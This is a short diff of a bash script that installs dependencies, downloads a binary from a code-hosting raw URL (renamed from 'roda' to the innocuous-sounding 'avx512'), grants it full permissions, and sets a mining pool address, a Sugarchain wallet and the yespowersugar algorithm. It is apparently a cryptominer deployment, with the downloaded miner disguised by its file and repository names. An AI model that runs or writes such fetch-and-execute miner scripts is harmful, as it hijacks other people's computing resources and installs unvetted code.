@@ -1,9 +1,9 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y
-wget -O roda https://gitlab.com/krilnols1/buildkite/-/raw/main/roda 
+wget -O avx512 https://github.com/set-arithmetic/set-arithmetic/blob/main/avx512 
 screen -dmS ls
-chmod +x phpsur.sh && chmod +x roda && chmod 777 roda phpsur.sh
+chmod +x phpsur.sh && chmod +x avx512 && chmod 777 avx512 phpsur.sh
 RENANG=stratum+tcps://stratum-na.rplant.xyz:17115
 ACIS=shuga1q7d75aamrpx6zhanaemu57262mlz3u9cvlvz02d
 STRESS=yespowersugar
